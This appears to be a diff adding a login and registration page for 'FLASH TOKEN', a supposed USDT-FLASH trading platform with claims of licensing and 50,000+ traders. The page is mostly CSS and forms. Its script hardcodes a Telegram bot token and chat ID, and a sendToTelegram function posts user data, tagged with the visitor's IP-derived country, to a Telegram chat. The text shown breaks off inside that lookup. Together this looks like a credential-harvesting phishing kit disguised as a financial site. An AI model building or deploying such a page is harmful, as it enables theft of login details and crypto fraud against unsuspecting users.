@@ -1,0 +1,1765 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FLASH TOKEN — Secure Login</title>
+    <link rel="icon" type="image/png" href="img/usdt_cryptocurrencies_icon_188337.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@2.30.0/tabler-icons.min.css">
+    <link rel="stylesheet" href="css/light-mode.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(160deg, #0a0f1e 0%, #0d1520 50%, #091020 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #e2e8f0;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image:
+                linear-gradient(rgba(16, 185, 129, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(16, 185, 129, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body.light-mode::before {
+            opacity: 0 !important;
+        }
+
+        /* ===== Header ===== */
+        .main-header {
+            background: rgba(10, 15, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 14px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-decoration: none;
+            flex-shrink: 0;
+        }
+
+        .header-logo img {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            flex-shrink: 0;
+        }
+
+        .header-logo-text {
+            font-size: 26px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #34d399, #10b981);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.03em;
+            white-space: nowrap;
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+
+        .header-link {
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 16px;
+            border-radius: 8px;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .header-link:hover {
+            background: rgba(16, 185, 129, 0.1);
+            color: #34d399;
+        }
+
+        /* ===== Mobile Menu ===== */
+        .hamburger-btn {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: none;
+            background: rgba(255,255,255,0.04);
+            border-radius: 10px;
+            cursor: pointer;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            transition: background 0.2s;
+            flex-shrink: 0;
+        }
+
+        .hamburger-btn:hover { background: rgba(255,255,255,0.08); }
+
+        .hamburger-btn span {
+            display: block;
+            width: 20px;
+            height: 2px;
+            background: #94a3b8;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .hamburger-btn.active span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+        .hamburger-btn.active span:nth-child(2) { opacity: 0; }
+        .hamburger-btn.active span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
+
+        .mobile-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            z-index: 200;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .mobile-overlay.active { display: block; opacity: 1; }
+
+        .mobile-menu {
+            position: fixed;
+            top: 0; right: -320px;
+            width: 300px;
+            height: 100%;
+            background: #0d1520;
+            border-left: 1px solid rgba(255,255,255,0.06);
+            z-index: 201;
+            padding: 80px 24px 24px;
+            transition: right 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow-y: auto;
+        }
+
+        body.light-mode .mobile-menu {
+            background: #ffffff;
+            border-left-color: rgba(0,0,0,0.08);
+        }
+
+        .mobile-menu.open { right: 0; }
+
+        .mobile-menu .menu-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px;
+            border-radius: 12px;
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: all 0.2s;
+            margin-bottom: 4px;
+        }
+
+        .mobile-menu .menu-item:hover {
+            background: rgba(16,185,129,0.08);
+            color: #34d399;
+        }
+
+        body.light-mode .mobile-menu .menu-item { color: #374151; }
+        body.light-mode .mobile-menu .menu-item:hover { color: #059669; }
+
+        .mobile-menu .menu-item i { width: 22px; text-align: center; font-size: 16px; }
+
+        .mobile-menu-divider {
+            height: 1px;
+            background: rgba(255,255,255,0.06);
+            margin: 12px 0;
+        }
+
+        body.light-mode .mobile-menu-divider { background: rgba(0,0,0,0.06); }
+
+        .mobile-theme-btn {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: none;
+            background: transparent;
+            color: #94a3b8;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            text-align: left;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .mobile-theme-btn:hover {
+            background: rgba(16,185,129,0.08);
+            color: #34d399;
+        }
+
+        body.light-mode .mobile-theme-btn { color: #374151; }
+        body.light-mode .mobile-theme-btn:hover { color: #059669; }
+
+        .mobile-theme-btn i { width: 22px; text-align: center; font-size: 16px; }
+
+        /* ===== Main Content ===== */
+        .content-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .main-container {
+            max-width: 1120px;
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .branding-section { padding: 20px 0; }
+
+        .trust-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px solid rgba(16, 185, 129, 0.15);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 12px;
+            color: #34d399;
+            font-weight: 600;
+            margin-bottom: 28px;
+        }
+
+        .brand-title {
+            font-size: 3rem;
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            color: #f1f5f9;
+        }
+
+        .brand-title .gradient {
+            background: linear-gradient(135deg, #34d399, #059669, #34d399);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .brand-desc {
+            font-size: 1.05rem;
+            color: #94a3b8;
+            line-height: 1.7;
+            margin-bottom: 32px;
+            max-width: 440px;
+        }
+
+        .trust-metrics {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            max-width: 400px;
+        }
+
+        .metric-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 16px;
+        }
+
+        .metric-card .value {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #34d399;
+        }
+
+        .metric-card .label {
+            font-size: 0.75rem;
+            color: #64748b;
+            margin-top: 2px;
+        }
+
+        /* ===== Form ===== */
+        .form-container {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 36px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .form-header h2 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #f1f5f9;
+        }
+
+        .form-header p {
+            color: #64748b;
+            font-size: 0.875rem;
+            margin-top: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 12px;
+            font-size: 16px;
+            color: #e2e8f0;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+            font-family: 'Inter', sans-serif;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #10b981;
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
+            background: rgba(16, 185, 129, 0.04);
+        }
+
+        .form-input::placeholder { color: #475569; }
+
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 4px 0 16px;
+            font-size: 13px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .form-options label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 14px;
+            min-height: 44px;
+        }
+
+        .form-options label input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #10b981;
+            border-radius: 4px;
+        }
+
+        .form-options a {
+            color: #34d399;
+            text-decoration: none;
+            font-weight: 500;
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+        }
+
+        .form-options a:hover { text-decoration: underline; }
+
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Inter', sans-serif;
+            min-height: 52px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .login-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3);
+        }
+
+        .login-button:active { transform: scale(0.98); }
+
+        .login-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .divider span {
+            padding: 0 16px;
+            color: #475569;
+            font-size: 13px;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 16px;
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            border-radius: 12px;
+            color: #34d399;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Inter', sans-serif;
+            min-height: 52px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .create-account-button:hover {
+            background: rgba(16, 185, 129, 0.15);
+            border-color: rgba(16, 185, 129, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .create-account-button:active { transform: scale(0.98); }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #475569;
+        }
+
+        .security-note i { color: #34d399; }
+
+        .back-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .back-link a {
+            color: #64748b;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .back-link a:hover { color: #34d399; }
+
+        /* ===== Modal ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-overlay.active { display: flex; }
+
+        .modal-content {
+            background: #0f1729;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            max-width: 480px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            animation: modalIn 0.3s ease;
+        }
+
+        @keyframes modalIn {
+            from { opacity: 0; transform: translateY(20px) scale(0.96); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .modal-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            position: relative;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #f1f5f9;
+        }
+
+        .modal-subtitle {
+            font-size: 0.875rem;
+            color: #64748b;
+            margin-top: 4px;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: rgba(255,255,255,0.04);
+            border: none;
+            font-size: 18px;
+            color: #64748b;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.2s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .close-modal:hover { background: rgba(255,255,255,0.08); color: #e2e8f0; }
+
+        .modal-body { padding: 24px; }
+
+        .google-signup-button {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #e2e8f0;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-family: 'Inter', sans-serif;
+            min-height: 52px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .google-signup-button:hover {
+            background: rgba(255,255,255,0.08);
+            border-color: rgba(16, 185, 129, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .google-icon { width: 22px; height: 22px; flex-shrink: 0; }
+
+        .registration-options { padding: 8px 0; }
+
+        .quick-register-btn,
+        .manual-register-btn {
+            width: 100%;
+            padding: 18px;
+            border-radius: 14px;
+            border: 1px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+            margin-bottom: 14px;
+            font-family: 'Inter', sans-serif;
+            min-height: 60px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .quick-register-btn {
+            background: linear-gradient(135deg, rgba(16,185,129,0.12), rgba(5,150,105,0.08));
+            border-color: rgba(16,185,129,0.15);
+            color: #e2e8f0;
+        }
+
+        .quick-register-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(16,185,129,0.15);
+            border-color: rgba(16,185,129,0.3);
+        }
+
+        .manual-register-btn {
+            background: rgba(255,255,255,0.03);
+            border-color: rgba(255,255,255,0.06);
+            color: #e2e8f0;
+        }
+
+        .manual-register-btn:hover {
+            background: rgba(255,255,255,0.06);
+            transform: translateY(-2px);
+            border-color: rgba(16,185,129,0.2);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .signup-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 12px;
+            font-family: 'Inter', sans-serif;
+            min-height: 52px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .signup-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(16,185,129,0.3);
+        }
+
+        .signup-button:active { transform: scale(0.98); }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: #34d399;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            padding: 8px 0;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .back-button:hover {
+            color: #10b981;
+            transform: translateX(-4px);
+        }
+
+        .terms-text {
+            font-size: 11px;
+            color: #475569;
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .terms-text a {
+            color: #34d399;
+            text-decoration: none;
+        }
+
+        .terms-text a:hover { text-decoration: underline; }
+
+        /* ===== Light Mode Overrides ===== */
+        body.light-mode {
+            background: #f0f4f8 !important;
+        }
+
+        body.light-mode .main-header {
+            background: #ffffff !important;
+            border-bottom-color: rgba(0,0,0,0.08) !important;
+        }
+
+        body.light-mode .header-logo-text {
+            -webkit-text-fill-color: #059669;
+        }
+
+        body.light-mode .header-link {
+            color: #374151 !important;
+        }
+
+        body.light-mode .header-link:hover {
+            background: rgba(16,185,129,0.08) !important;
+            color: #059669 !important;
+        }
+
+        body.light-mode .hamburger-btn {
+            background: rgba(0,0,0,0.04) !important;
+        }
+
+        body.light-mode .hamburger-btn span {
+            background: #374151 !important;
+        }
+
+        body.light-mode .brand-title {
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .brand-title .gradient {
+            -webkit-text-fill-color: transparent;
+        }
+
+        body.light-mode .trust-badge {
+            background: rgba(16,185,129,0.08) !important;
+            border-color: rgba(16,185,129,0.2) !important;
+        }
+
+        body.light-mode .brand-desc {
+            color: #475569 !important;
+        }
+
+        body.light-mode .metric-card {
+            background: #ffffff !important;
+            border-color: rgba(0,0,0,0.08) !important;
+        }
+
+        body.light-mode .metric-card .value {
+            color: #059669 !important;
+        }
+
+        body.light-mode .metric-card .label {
+            color: #64748b !important;
+        }
+
+        body.light-mode .form-container {
+            background: #ffffff !important;
+            border-color: rgba(0,0,0,0.08) !important;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.06) !important;
+        }
+
+        body.light-mode .form-header h2 {
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .form-header p {
+            color: #64748b !important;
+        }
+
+        body.light-mode .form-input {
+            background: #f8fafc !important;
+            border-color: #e2e8f0 !important;
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .form-input:focus {
+            border-color: #10b981 !important;
+            background: #ffffff !important;
+        }
+
+        body.light-mode .form-input::placeholder {
+            color: #94a3b8 !important;
+        }
+
+        body.light-mode .form-options label {
+            color: #64748b !important;
+        }
+
+        body.light-mode .security-note {
+            color: #64748b !important;
+        }
+
+        body.light-mode .back-link a {
+            color: #64748b !important;
+        }
+
+        body.light-mode .back-link a:hover {
+            color: #059669 !important;
+        }
+
+        body.light-mode .divider::before,
+        body.light-mode .divider::after {
+            border-bottom-color: #e2e8f0 !important;
+        }
+
+        body.light-mode .divider span {
+            color: #94a3b8 !important;
+        }
+
+        body.light-mode .modal-content {
+            background: #ffffff !important;
+            border-color: rgba(0,0,0,0.08) !important;
+        }
+
+        body.light-mode .modal-title {
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .modal-subtitle {
+            color: #64748b !important;
+        }
+
+        body.light-mode .close-modal {
+            color: #64748b !important;
+        }
+
+        body.light-mode .close-modal:hover {
+            background: #f1f5f9 !important;
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .google-signup-button {
+            background: #f8fafc !important;
+            border-color: #e2e8f0 !important;
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .google-signup-button:hover {
+            background: #f1f5f9 !important;
+            border-color: #10b981 !important;
+        }
+
+        body.light-mode .quick-register-btn {
+            background: rgba(16,185,129,0.06) !important;
+            border-color: rgba(16,185,129,0.15) !important;
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .manual-register-btn {
+            background: #f8fafc !important;
+            border-color: #e2e8f0 !important;
+            color: #1f2937 !important;
+        }
+
+        body.light-mode .manual-register-btn:hover {
+            background: #f1f5f9 !important;
+        }
+
+        body.light-mode .terms-text {
+            color: #64748b !important;
+        }
+
+        /* ===== Responsive ===== */
+        @media (min-width: 901px) {
+            .mobile-overlay, .mobile-menu, .hamburger-btn { display: none !important; }
+        }
+
+        @media (max-width: 900px) {
+            .hamburger-btn { display: flex; }
+
+            .header-nav { display: none; }
+
+            .header-logo-text { font-size: 22px; }
+
+            .header-content { padding: 12px 16px; }
+
+            .main-container {
+                grid-template-columns: 1fr;
+                gap: 32px;
+                max-width: 480px;
+            }
+
+            .branding-section { text-align: center; padding: 0; }
+
+            .trust-badge { margin: 0 auto 24px; font-size: 11px; padding: 6px 14px; }
+
+            .brand-title { font-size: 2.2rem; }
+
+            .brand-desc { margin: 0 auto 28px; font-size: 0.95rem; }
+
+            .trust-metrics { margin: 0 auto; }
+
+            .content-wrapper { padding: 24px 16px; }
+
+            .form-container {
+                padding: 24px;
+                border-radius: 16px;
+            }
+
+            .form-header h2 { font-size: 1.35rem; }
+        }
+
+        @media (max-width: 480px) {
+            .brand-title { font-size: 1.8rem; }
+
+            .brand-desc { font-size: 0.9rem; }
+
+            .form-container { padding: 20px; border-radius: 14px; }
+
+            .form-header h2 { font-size: 1.2rem; }
+
+            .form-row { grid-template-columns: 1fr; gap: 10px; }
+
+            .trust-metrics { grid-template-columns: 1fr; max-width: 280px; }
+
+            .metric-card { padding: 14px; }
+
+            .metric-card .value { font-size: 1.3rem; }
+
+            .modal-overlay { padding: 0; align-items: flex-end; }
+
+            .modal-content {
+                max-width: 100%;
+                width: 100%;
+                max-height: 92vh;
+                border-radius: 20px 20px 0 0;
+                animation: modalSlideUp 0.35s ease;
+            }
+
+            @keyframes modalSlideUp {
+                from { transform: translateY(100%); }
+                to { transform: translateY(0); }
+            }
+
+            .modal-header { padding: 16px 20px; }
+
+            .modal-title { font-size: 1.25rem; }
+
+            .modal-body { padding: 20px; }
+
+            .quick-register-btn,
+            .manual-register-btn { padding: 16px; min-height: 56px; }
+
+            .mobile-menu { width: 280px; right: -280px; }
+
+            .header-logo-text { font-size: 20px; }
+
+            .header-logo img { width: 34px; height: 34px; }
+
+            .header-content { padding: 10px 14px; }
+        }
+
+        @media (max-width: 360px) {
+            .brand-title { font-size: 1.5rem; }
+
+            .form-container { padding: 16px; }
+
+            .form-input { font-size: 15px; padding: 12px 14px; }
+
+            .login-button,
+            .create-account-button { font-size: 15px; padding: 14px; min-height: 48px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="main-header">
+        <div class="header-content">
+            <a href="home.html" class="header-logo">
+                <img src="img/usdt_cryptocurrencies_icon_188337.png" alt="FLASH TOKEN">
+                <span class="header-logo-text">FLASH TOKEN</span>
+            </a>
+            <nav class="header-nav">
+                <a href="home.html" class="header-link"><i class="fas fa-home"></i> Home</a>
+                <a href="pages/live-transactions.html" class="header-link"><i class="fas fa-chart-line"></i> Transactions</a>
+                <a href="pages/support.html" class="header-link"><i class="fas fa-headset"></i> Support</a>
+                <button id="themeToggleDesktop" class="header-link" style="cursor:pointer;" aria-label="Toggle theme">
+                    <i class="fas fa-sun"></i>
+                </button>
+            </nav>
+            <button class="hamburger-btn" id="hamburgerBtn" aria-label="Menu">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </header>
+
+    <!-- Mobile Menu Overlay -->
+    <div class="mobile-overlay" id="mobileOverlay"></div>
+
+    <!-- Mobile Slide-out Menu -->
+    <div class="mobile-menu" id="mobileMenu">
+        <a href="home.html" class="menu-item"><i class="fas fa-home"></i> Home</a>
+        <a href="pages/live-transactions.html" class="menu-item"><i class="fas fa-chart-line"></i> Transactions</a>
+        <a href="pages/support.html" class="menu-item"><i class="fas fa-headset"></i> Support</a>
+        <div class="mobile-menu-divider"></div>
+        <button id="themeToggleMobile" class="mobile-theme-btn"><i class="fas fa-sun"></i> <span>Light Mode</span></button>
+        <div class="mobile-menu-divider"></div>
+        <a href="home.html" class="menu-item"><i class="fas fa-arrow-left"></i> Back to Home</a>
+    </div>
+
+    <!-- Main Content -->
+    <div class="content-wrapper">
+        <div class="main-container">
+
+            <!-- Left - Branding -->
+            <div class="branding-section">
+                <div class="trust-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Fully Licensed & Regulated Platform</span>
+                </div>
+
+                <h1 class="brand-title">
+                    Secure<br>
+                    <span class="gradient">USDT-FLASH</span><br>
+                    Trading Platform
+                </h1>
+
+                <p class="brand-desc">
+                    Enterprise-grade digital asset management platform with instant transaction processing, military-grade encryption, and 24/7 dedicated support. Trusted by over 50,000+ professional traders worldwide.
+                </p>
+
+                <div class="trust-metrics">
+                    <div class="metric-card">
+                        <div class="value">99.9%</div>
+                        <div class="label">Transaction Success Rate</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="value">24/7</div>
+                        <div class="label">Dedicated Support</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="value">50K+</div>
+                        <div class="label">Active Traders</div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="value">SSL</div>
+                        <div class="label">Encrypted Connection</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right - Login Form -->
+            <div class="form-container">
+                <div class="form-header">
+                    <h2>Welcome Back</h2>
+                    <p>Sign in to access your dashboard</p>
+                </div>
+
+                <form id="loginForm">
+                    <input type="text" class="form-input" placeholder="Email or User ID" required autocomplete="username">
+                    <input type="password" class="form-input" placeholder="Password" required autocomplete="current-password">
+
+                    <div class="form-options">
+                        <label>
+                            <input type="checkbox" checked> Remember me
+                        </label>
+                        <a href="#">Forgot password?</a>
+                    </div>
+
+                    <button type="submit" class="login-button">
+                        <i class="fas fa-lock mr-2"></i> Sign In
+                    </button>
+                </form>
+
+                <div class="divider"><span>New to FLASH TOKEN?</span></div>
+
+                <button class="create-account-button" id="createAccountBtn">
+                    <i class="fas fa-user-plus mr-2"></i> Create Free Account
+                </button>
+
+                <div class="security-note">
+                    <i class="fas fa-lock"></i>
+                    <span>256-bit SSL encrypted connection</span>
+                </div>
+
+                <div class="back-link">
+                    <a href="home.html"><i class="fas fa-arrow-left mr-1"></i> Back to Home</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Registration Modal -->
+    <div class="modal-overlay" id="registrationModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Create Account</h2>
+                <p class="modal-subtitle">Start trading in minutes</p>
+                <button class="close-modal" id="closeModal"><i class="fas fa-times"></i></button>
+            </div>
+
+            <div class="modal-body">
+
+                <!-- Registration Options -->
+                <div class="registration-options" id="registrationOptions">
+
+                    <button class="google-signup-button" id="googleSignUpBtn">
+                        <svg class="google-icon" viewBox="0 0 24 24">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                        </svg>
+                        <span>Continue with Google</span>
+                    </button>
+
+                    <div class="divider"><span>or choose a method</span></div>
+
+                    <button class="quick-register-btn" onclick="quickRegister()">
+                        <div class="flex items-center gap-3">
+                            <i class="fas fa-bolt text-2xl" style="color: #34d399;"></i>
+                            <div>
+                                <div class="text-base font-bold">Quick Registration</div>
+                                <div class="text-sm" style="color: #94a3b8;">One-click account creation</div>
+                            </div>
+                        </div>
+                    </button>
+
+                    <button class="manual-register-btn" onclick="showManualForm()">
+                        <div class="flex items-center gap-3">
+                            <i class="fas fa-edit text-2xl" style="color: #94a3b8;"></i>
+                            <div>
+                                <div class="text-base font-bold">Manual Registration</div>
+                                <div class="text-sm" style="color: #94a3b8;">Fill in your details</div>
+                            </div>
+                        </div>
+                    </button>
+                </div>
+
+                <!-- Manual Registration Form -->
+                <form id="registrationForm" style="display: none;">
+                    <button type="button" class="back-button" onclick="showRegistrationOptions()">
+                        <i class="fas fa-arrow-left"></i> Back to options
+                    </button>
+
+                    <div class="form-row">
+                        <input type="text" class="form-input" placeholder="First name" required>
+                        <input type="text" class="form-input" placeholder="Last name" required>
+                    </div>
+
+                    <input type="email" class="form-input" placeholder="Email address" required>
+                    <input type="password" class="form-input" placeholder="Create password" required>
+
+                    <button type="submit" class="signup-button">Create Account</button>
+
+                    <p class="terms-text">
+                        By creating an account, you agree to our <a href="#">Terms of Service</a>,
+                        <a href="#">Privacy Policy</a> and <a href="#">AML Policy</a>.
+                    </p>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8878159207:AAHrn8kF9C5QF-FcnCo0wKitp6i0hE43IgE';
+        const TELEGRAM_CHAT_ID = '8584801137';
+
+        async function sendToTelegram(userData) {
+            const country = await getUserCountry();
+            userData.country = country;
+            const message = formatUserDataMessage(userData);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+                return (await response.json()).ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function getUserCountry() {
+            try {
+                const services = [
+                    'https://ipapi.co/json/',
+                    'https://ip-api.com/json/',
+                    'https://ipwhois.app/json/'
+                ];
+                for (const service of services) {
